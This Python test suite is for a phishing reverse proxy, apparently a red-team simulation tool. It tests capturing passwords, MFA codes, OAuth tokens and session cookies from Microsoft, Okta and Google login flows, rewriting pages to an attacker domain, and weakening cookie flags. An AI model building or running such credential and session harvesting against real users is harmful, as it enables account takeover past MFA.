"""Tests for reverse proxy, credential capture, and session harvesting."""

from __future__ import annotations

import json
from unittest.mock import patch, MagicMock

from bluephishproxy.crypto import encrypt, decrypt
from bluephishproxy.proxy import (
    extract_credentials,
    extract_credentials_json,
    encrypt_credentials,
    encrypt_session_data,
    extract_session_tokens,
    rewrite_response_urls,
    rewrite_location_header,
    rewrite_set_cookie,
)
from bluephishproxy.database import (
    import_recipients,
    list_credentials,
    list_captured_sessions,
    get_credential,
    get_credential_stats,
    save_credential,
    save_captured_session,
    get_captured_session,
    invalidate_captured_session,
)


# --- Crypto tests ---------------------------------------------------------

class TestCrypto:
    def test_round_trip(self):
        key = "test-engagement-key-2024"
        plaintext = "hunter2"
        ciphertext = encrypt(plaintext, key)
        assert ciphertext != plaintext
        assert decrypt(ciphertext, key) == plaintext

    def test_different_keys_fail(self):
        ct = encrypt("secret", "key1")
        try:
            result = decrypt(ct, "key2")
            assert False, "should have raised"
        except ValueError:
            pass

    def test_different_salts_produce_different_ciphertexts(self):
        a = encrypt("same", "key")
        b = encrypt("same", "key")
        assert a != b

    def test_empty_string(self):
        ct = encrypt("", "key")
        assert decrypt(ct, "key") == ""

    def test_unicode(self):
        text = "pässwörd\U0001f512"
        ct = encrypt(text, "key")
        assert decrypt(ct, "key") == text


# --- Credential extraction tests -----------------------------------------

class TestExtractCredentials:
    def test_standard_login_form(self):
        form = {"username": "admin", "password": "hunter2"}
        u, p, found = extract_credentials(form)
        assert u == "admin"
        assert p == "hunter2"
        assert found

    def test_microsoft_loginfmt(self):
        form = {"loginfmt": "user@contoso.com", "passwd": "P@ssw0rd"}
        u, p, found = extract_credentials(form)
        assert u == "user@contoso.com"
        assert p == "P@ssw0rd"
        assert found

    def test_email_field(self):
        form = {"email": "victim@corp.com", "pass": "secret"}
        u, p, found = extract_credentials(form)
        assert u == "victim@corp.com"
        assert p == "secret"
        assert found

    def test_no_credential_fields(self):
        form = {"csrf_token": "abc123", "redirect": "/dashboard"}
        u, p, found = extract_credentials(form)
        assert u == ""
        assert p == ""
        assert not found

    def test_username_only(self):
        form = {"login": "admin", "csrf": "xyz"}
        u, p, found = extract_credentials(form)
        assert u == "admin"
        assert p == ""
        assert found

    def test_case_insensitive_not_needed(self):
        form = {"USERNAME": "admin", "PASSWORD": "pass"}
        u, p, found = extract_credentials(form)
        assert u == "admin"
        assert p == "pass"


# --- JSON credential extraction tests ------------------------------------

class TestExtractCredentialsJson:
    def test_azure_ad_login(self):
        body = json.dumps({
            "login": "user@contoso.com",
            "loginFmt": "user@contoso.com",
            "passwd": "P@ssw0rd!",
            "ctx": "rQQIAR...",
            "flowToken": "AQA...",
        }).encode()
        u, p, raw, found = extract_credentials_json(body)
        assert found
        assert u == "user@contoso.com"
        assert p == "P@ssw0rd!"

    def test_azure_get_credential_type(self):
        body = json.dumps({
            "username": "user@contoso.com",
            "isOtherIdpSupported": True,
            "checkPhones": False,
        }).encode()
        u, p, raw, found = extract_credentials_json(body)
        assert found
        assert u == "user@contoso.com"
        assert p == ""

    def test_okta_authn(self):
        body = json.dumps({
            "username": "admin@corp.com",
            "password": "Secret123",
            "options": {"multiOptionalFactorEnroll": False},
        }).encode()
        u, p, raw, found = extract_credentials_json(body)
        assert found
        assert u == "admin@corp.com"
        assert p == "Secret123"

    def test_nested_credentials(self):
        body = json.dumps({
            "auth": {
                "credentials": {
                    "username": "nested@user.com",
                    "password": "deep_secret",
                }
            }
        }).encode()
        u, p, raw, found = extract_credentials_json(body)
        assert found
        assert u == "nested@user.com"
        assert p == "deep_secret"

    def test_google_style_email(self):
        body = json.dumps({
            "Email": "victim@gmail.com",
            "Passwd": "",
            "continue": "https://mail.google.com",
        }).encode()
        u, p, raw, found = extract_credentials_json(body)
        assert found
        assert u == "victim@gmail.com"

    def test_google_style_password_stage(self):
        body = json.dumps({
            "Passwd": "hunter2",
            "continue": "https://mail.google.com",
        }).encode()
        u, p, raw, found = extract_credentials_json(body)
        assert found
        assert p == "hunter2"

    def test_no_credentials_in_json(self):
        body = json.dumps({
            "action": "redirect",
            "target": "/dashboard",
        }).encode()
        u, p, raw, found = extract_credentials_json(body)
        assert not found

    def test_invalid_json(self):
        u, p, raw, found = extract_credentials_json(b"not json at all")
        assert not found
        assert u == ""

    def test_mfa_code_captured(self):
        body = json.dumps({
            "otpCode": "482901",
            "stateToken": "abc...",
        }).encode()
        u, p, raw, found = extract_credentials_json(body)
        assert found
        assert p == "482901"

    def test_oauth_token_captured(self):
        body = json.dumps({
            "accessToken": "eyJhbGciOiJSUzI1NiIs...",
            "tokenType": "Bearer",
        }).encode()
        u, p, raw, found = extract_credentials_json(body)
        assert found
        assert "eyJ" in p


# --- Credential encryption tests -----------------------------------------

class TestEncryptCredentials:
    def test_with_key(self):
        u_enc, p_enc, f_enc = encrypt_credentials(
            "admin", "pass123", {"username": "admin", "password": "pass123"},
            "engagement-key",
        )
        assert u_enc != "admin"
        assert p_enc != "pass123"
        assert decrypt(u_enc, "engagement-key") == "admin"
        assert decrypt(p_enc, "engagement-key") == "pass123"

    def test_without_key_base64(self):
        import base64
        u_enc, p_enc, f_enc = encrypt_credentials(
            "admin", "pass", {}, ""
        )
        assert base64.b64decode(u_enc).decode() == "admin"
        assert base64.b64decode(p_enc).decode() == "pass"


# --- Session token extraction tests --------------------------------------

class TestExtractSessionTokens:
    def test_known_cookie_names(self):
        cookies = {"sessionid": "abc123", "csrftoken": "x"}
        tokens = extract_session_tokens(cookies, [])
        assert "sessionid" in tokens
        assert tokens["sessionid"] == "abc123"

    def test_long_value_cookies(self):
        cookies = {"custom_auth": "a" * 30}
        tokens = extract_session_tokens(cookies, [])
        assert "custom_auth" in tokens

    def test_set_cookie_headers(self):
        tokens = extract_session_tokens({}, [
            "ESTSAUTH=abc123def456; Path=/; Secure; HttpOnly",
            "tracking=x; Path=/",
        ])
        assert "ESTSAUTH" in tokens
        assert tokens["ESTSAUTH"] == "abc123def456"

    def test_short_unknown_cookie_excluded(self):
        cookies = {"x": "y"}
        tokens = extract_session_tokens(cookies, [])
        assert "x" not in tokens


# --- URL rewriting tests -------------------------------------------------

class TestRewriteUrls:
    def test_html_url_rewrite(self):
        html = b'<a href="https://login.example.com/auth">Login</a>'
        result = rewrite_response_urls(
            html, "https://login.example.com", "https://proxy.attacker.com/c/abc",
            "text/html",
        )
        assert b"proxy.attacker.com" in result
        assert b"login.example.com" not in result

    def test_non_html_passthrough(self):
        data = b'{"url": "https://login.example.com"}'
        result = rewrite_response_urls(
            data, "https://login.example.com", "https://proxy.com",
            "application/json",
        )
        assert result == data

    def test_javascript_rewrite(self):
        js = b'var url = "https://login.example.com/api";'
        result = rewrite_response_urls(
            js, "https://login.example.com", "https://proxy.com",
            "application/javascript",
        )
        assert b"proxy.com" in result


class TestRewriteLocation:
    def test_same_domain_rewrite(self):
        result = rewrite_location_header(
            "https://login.example.com/callback",
            "https://login.example.com",
            "https://proxy.com/c/abc",
        )
        assert "proxy.com" in result

    def test_relative_path_unchanged(self):
        result = rewrite_location_header(
            "/dashboard",
            "https://login.example.com",
            "https://proxy.com/c/abc",
        )
        assert result == "/dashboard"

    def test_external_domain_unchanged(self):
        result = rewrite_location_header(
            "https://other.com/page",
            "https://login.example.com",
            "https://proxy.com/c/abc",
        )
        assert result == "https://other.com/page"


class TestRewriteSetCookie:
    def test_domain_rewrite(self):
        result = rewrite_set_cookie(
            "sid=abc; Domain=.example.com; Secure; HttpOnly; SameSite=None",
            "proxy.com",
        )
        assert "Domain=proxy.com" in result
        assert "Secure" not in result
        assert "SameSite=Lax" in result
        assert "HttpOnly" in result


# --- Database credential storage tests ------------------------------------

class TestCredentialDB:
    def test_save_and_list(self, cfg):
        save_credential(cfg, {
            "session_id": "s1",
            "campaign_id": "c1",
            "username_enc": "dXNlcg==",
            "password_enc": "cGFzcw==",
            "ip_address": "10.0.0.1",
        })
        creds = list_credentials(cfg, campaign_id="c1")
        assert len(creds) == 1
        assert creds[0]["username_enc"] == "dXNlcg=="
        assert creds[0]["campaign_id"] == "c1"

    def test_get_by_id(self, cfg):
        cid = save_credential(cfg, {
            "session_id": "s2",
            "campaign_id": "c1",
            "username_enc": "enc_u",
            "password_enc": "enc_p",
        })
        cred = get_credential(cfg, cid)
        assert cred is not None
        assert cred["session_id"] == "s2"

    def test_stats(self, cfg):
        for i in range(3):
            save_credential(cfg, {
                "session_id": f"s{i}",
                "campaign_id": "c1",
                "ip_address": f"10.0.0.{i}",
                "username_enc": "u",
                "password_enc": "p",
            })
        stats = get_credential_stats(cfg, "c1")
        assert stats["total"] == 3
        assert stats["unique_ips"] == 3


class TestCapturedSessionDB:
    def test_save_and_list(self, cfg):
        save_captured_session(cfg, {
            "campaign_id": "c1",
            "session_data_enc": "encrypted_data",
            "target_domain": "login.example.com",
            "ip_address": "10.0.0.1",
        })
        sessions = list_captured_sessions(cfg, campaign_id="c1")
        assert len(sessions) == 1
        assert sessions[0]["target_domain"] == "login.example.com"
        assert sessions[0]["valid"] == 1

    def test_get_by_id(self, cfg):
        sid = save_captured_session(cfg, {
            "campaign_id": "c1",
            "session_data_enc": "data",
            "target_domain": "example.com",
        })
        s = get_captured_session(cfg, sid)
        assert s is not None
        assert s["campaign_id"] == "c1"

    def test_invalidate(self, cfg):
        sid = save_captured_session(cfg, {
            "campaign_id": "c1",
            "session_data_enc": "data",
        })
        assert invalidate_captured_session(cfg, sid)
        s = get_captured_session(cfg, sid)
        assert s["valid"] == 0


# --- Route integration tests (proxy mode) ---------------------------------

class TestProxyRoutes:
    @patch("bluephishproxy.proxy.http_client.request")
    def test_campaign_proxy_get(self, mock_req, client, cfg, campaign):
        campaign["target_url"] = "https://login.example.com"
        from bluephishproxy.database import save_campaign_db
        save_campaign_db(campaign, cfg)

        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.headers = {"Content-Type": "text/html"}
        mock_resp.content = b"<html><body>Login Page</body></html>"
        mock_resp.cookies = {}
        mock_req.return_value = mock_resp

        resp = client.get(f"/c/{campaign['id']}/")
        assert resp.status_code == 200
        assert b"Login Page" in resp.data

    @patch("bluephishproxy.proxy.http_client.request")
    def test_tracked_proxy_get(self, mock_req, client, cfg, campaign):
        campaign["target_url"] = "https://login.example.com"
        from bluephishproxy.database import save_campaign_db
        save_campaign_db(campaign, cfg)

        results = import_recipients(cfg, campaign["id"], [
            {"email": "victim@corp.com"},
        ])
        token = results[0]["token"]

        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.headers = {"Content-Type": "text/html"}
        mock_resp.content = b"<html><body>Login</body></html>"
        mock_resp.cookies = {}
        mock_req.return_value = mock_resp

        resp = client.get(f"/t/{token}")
        assert resp.status_code == 200
        assert b"Login" in resp.data

    @patch("bluephishproxy.proxy.http_client.request")
    def test_proxy_post_captures_credentials(self, mock_req, client, cfg, campaign):
        campaign["target_url"] = "https://login.example.com"
        from bluephishproxy.database import save_campaign_db
        save_campaign_db(campaign, cfg)

        results = import_recipients(cfg, campaign["id"], [
            {"email": "target@corp.com"},
        ])
        token = results[0]["token"]

        mock_resp = MagicMock()
        mock_resp.status_code = 302
        mock_resp.headers = {
            "Location": "https://login.example.com/dashboard",
            "Set-Cookie": "ESTSAUTH=bigtoken123456789012345; Path=/; Secure; HttpOnly",
        }
        mock_resp.content = b""
        mock_resp.cookies = {"ESTSAUTH": "bigtoken123456789012345"}
        mock_req.return_value = mock_resp

        resp = client.post(
            f"/t/{token}/login",
            data={"loginfmt": "victim@corp.com", "passwd": "P@ssw0rd"},
            content_type="application/x-www-form-urlencoded",
        )

        creds = list_credentials(cfg, campaign_id=campaign["id"])
        assert len(creds) >= 1

        sessions = list_captured_sessions(cfg, campaign_id=campaign["id"])
        assert len(sessions) >= 1

    @patch("bluephishproxy.proxy.http_client.request")
    def test_proxy_json_post_captures_credentials(self, mock_req, client, cfg, campaign):
        campaign["target_url"] = "https://login.microsoftonline.com"
        from bluephishproxy.database import save_campaign_db
        save_campaign_db(campaign, cfg)

        results = import_recipients(cfg, campaign["id"], [
            {"email": "azure@corp.com"},
        ])
        token = results[0]["token"]

        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.headers = {"Content-Type": "application/json"}
        mock_resp.content = b'{"FlowToken": "abc"}'
        mock_resp.cookies = {}
        mock_req.return_value = mock_resp

        resp = client.post(
            f"/t/{token}/common/login",
            data=json.dumps({
                "login": "victim@contoso.com",
                "passwd": "AzureP@ss!",
                "ctx": "rQQI...",
            }),
            content_type="application/json",
        )

        creds = list_credentials(cfg, campaign_id=campaign["id"])
        assert len(creds) >= 1

    @patch("bluephishproxy.proxy.http_client.request")
    def test_multi_stage_login(self, mock_req, client, cfg, campaign):
        campaign["target_url"] = "https://login.microsoftonline.com"
        from bluephishproxy.database import save_campaign_db
        save_campaign_db(campaign, cfg)

        results = import_recipients(cfg, campaign["id"], [
            {"email": "multistage@corp.com"},
        ])
        token = results[0]["token"]

        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.headers = {"Content-Type": "application/json"}
        mock_resp.content = b'{"FlowToken": "stage1"}'
        mock_resp.cookies = {}
        mock_req.return_value = mock_resp

        client.post(
            f"/t/{token}/common/GetCredentialType",
            data=json.dumps({"username": "staged@contoso.com"}),
            content_type="application/json",
        )

        creds_stage1 = list_credentials(cfg, campaign_id=campaign["id"])
        assert len(creds_stage1) >= 1

        mock_resp2 = MagicMock()
        mock_resp2.status_code = 302
        mock_resp2.headers = {
            "Location": "https://login.microsoftonline.com/done",
            "Set-Cookie": "ESTSAUTH=tokenvalue1234567890abc; Path=/; Secure",
        }
        mock_resp2.content = b""
        mock_resp2.cookies = {"ESTSAUTH": "tokenvalue1234567890abc"}
        mock_req.return_value = mock_resp2

        client.post(
            f"/t/{token}/common/login",
            data=json.dumps({"passwd": "StageTwo!"}),
            content_type="application/json",
        )

        creds_stage2 = list_credentials(cfg, campaign_id=campaign["id"])
        assert len(creds_stage2) >= 2

        latest = creds_stage2[0]
        assert latest["username_enc"]
        assert latest["password_enc"]

    @patch("bluephishproxy.proxy.http_client.request")
    def test_proxy_502_on_target_error(self, mock_req, client, cfg, campaign):
        campaign["target_url"] = "https://login.example.com"
        from bluephishproxy.database import save_campaign_db
        save_campaign_db(campaign, cfg)

        import requests as req_lib
        mock_req.side_effect = req_lib.ConnectionError("refused")

        resp = client.get(f"/c/{campaign['id']}/")
        assert resp.status_code == 502


# --- Credential API tests ------------------------------------------------

class TestCredentialAPI:
    def test_list_credentials(self, client, cfg):
        save_credential(cfg, {
            "campaign_id": "c1",
            "username_enc": "u",
            "password_enc": "p",
        })
        resp = client.get("/api/operator/credentials?campaign_id=c1")
        assert resp.status_code == 200
        data = resp.get_json()
        assert len(data) == 1

    def test_get_credential(self, client, cfg):
        cid = save_credential(cfg, {
            "campaign_id": "c1",
            "username_enc": "u",
            "password_enc": "p",
        })
        resp = client.get(f"/api/operator/credentials/{cid}")
        assert resp.status_code == 200

    def test_credential_stats(self, client, cfg):
        save_credential(cfg, {
            "campaign_id": "c1",
            "username_enc": "u",
            "password_enc": "p",
            "ip_address": "10.0.0.1",
        })
        resp = client.get("/api/operator/credentials/stats?campaign_id=c1")
        assert resp.status_code == 200
        data = resp.get_json()
        assert data["total"] == 1

    def test_credential_not_found(self, client):
        resp = client.get("/api/operator/credentials/99999")
        assert resp.status_code == 404


class TestSessionAPI:
    def test_list_sessions(self, client, cfg):
        save_captured_session(cfg, {
            "campaign_id": "c1",
            "session_data_enc": "data",
        })
        resp = client.get("/api/operator/sessions?campaign_id=c1")
        assert resp.status_code == 200
        data = resp.get_json()
        assert len(data) == 1

    def test_get_session(self, client, cfg):
        sid = save_captured_session(cfg, {
            "campaign_id": "c1",
            "session_data_enc": "data",
        })
        resp = client.get(f"/api/operator/sessions/{sid}")
        assert resp.status_code == 200

    def test_invalidate_session(self, client, cfg):
        sid = save_captured_session(cfg, {
            "campaign_id": "c1",
            "session_data_enc": "data",
        })
        resp = client.post(f"/api/operator/sessions/{sid}/invalidate")
        assert resp.status_code == 200
        assert resp.get_json()["status"] == "invalidated"

    def test_session_not_found(self, client):
        resp = client.get("/api/operator/sessions/99999")
        assert resp.status_code == 404
